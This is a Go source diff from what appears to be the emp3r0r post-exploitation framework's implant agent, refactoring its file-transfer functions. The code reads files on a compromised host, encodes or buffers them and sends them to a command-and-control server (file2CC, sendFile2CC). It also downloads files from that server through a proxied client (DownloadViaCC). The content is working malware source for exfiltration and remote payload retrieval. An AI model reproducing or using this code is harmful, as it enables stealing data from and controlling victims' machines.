@@ -1,24 +1,23 @@
+//go:build linux
+// +build linux
+
 package agent
 
 import (
 	"bufio"
-	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"fmt"
-	"io/ioutil"
 	"log"
-	"net/http"
 	"os"
 	"time"
 
-	"github.com/cavaliercoder/grab"
-	"github.com/google/uuid"
+	"github.com/cavaliergopher/grab/v3"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// send local file to CC
+// send local file to CC, Deprecated
 func file2CC(filepath string, offset int64) (checksum string, err error) {
 	// open and read the target file
 	f, err := os.Open(filepath)
@@ -36,9 +35,9 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	// base64 encode
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
-	fileData := MsgTunData{
-		Payload: "FILE" + OpSep + filepath + OpSep + payload,
-		Tag:     Tag,
+	fileData := emp3r0r_data.MsgTunData{
+		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
+		Tag:     emp3r0r_data.AgentTag,
 	}
 
 	// send
@@ -52,29 +51,12 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 	retData := false
 	if path == "" {
 		retData = true
-		path = fmt.Sprintf("%s/%s", os.TempDir(), uuid.NewString())
+		log.Printf("No path specified, will return []byte")
 	}
 
 	// use EmpHTTPClient
-	// start with an empty pool
-	rootCAs := x509.NewCertPool()
-
-	// add our cert
-	if ok := rootCAs.AppendCertsFromPEM(tun.CACrt); !ok {
-		log.Println("No certs appended")
-	}
-
-	// Trust the augmented cert pool in our client
-	config := &tls.Config{
-		InsecureSkipVerify: false,
-		RootCAs:            rootCAs,
-	}
-
-	// return our http client
-	tr := &http.Transport{TLSClientConfig: config}
 	client := grab.NewClient()
-	client.HTTPClient.Timeout = time.Duration(10) * time.Second
-	client.HTTPClient.Transport = tr // use our TLS transport
+	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
 
 	req, err := grab.NewRequest(path, url)
 	if err != nil {
@@ -83,13 +65,18 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 	}
 	resp := client.Do(req)
 	if retData {
-		data, err = ioutil.ReadFile(path)
-		return
+		return resp.Bytes()
 	}
 
 	// progress
 	t := time.NewTicker(time.Second)
-	defer t.Stop()
+	defer func() {
+		t.Stop()
+		if !retData && !util.IsFileExist(path) {
+			data = nil
+			err = fmt.Errorf("%s not found, download failed", path)
+		}
+	}()
 	for !resp.IsComplete() {
 		select {
 		case <-resp.Done:
@@ -99,7 +86,7 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 				log.Print(err)
 				return
 			}
-			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size)
+			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size())
 			return
 		case <-t.C:
 			log.Printf("%.02f%% complete\n", resp.Progress()*100)
@@ -110,7 +97,8 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 }
 
 // sendFile2CC send file to CC, with buffering
-func sendFile2CC(filepath string, offset int64, token string) (checksum string, err error) {
+// using FTP API
+func sendFile2CC(filepath string, offset int64, token string) (err error) {
 	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
 	// open and read the target file
 	f, err := os.Open(filepath)
@@ -128,7 +116,7 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 	}
 
 	// connect
-	url := CCAddress + tun.FTPAPI + "/" + token
+	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
 	conn, ctx, cancel, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
@@ -136,10 +124,10 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 		return
 	}
 	defer cancel()
+	defer conn.Close()
 
 	// read
 	var (
-		// send = make(chan []byte, 1024*8)
 		buf []byte
 	)
 
@@ -164,15 +152,6 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 			return
 		}
 		log.Printf("Sending remaining %d bytes", len(buf))
-	}
-
-	// checksum
-	go func() {
-		checksum = tun.SHA256SumFile(filepath)
-	}()
-	log.Printf("Reading %s finished, calculating sha256sum", filepath)
-	for checksum == "" {
-		time.Sleep(100 * time.Millisecond)
 	}
 
 	return
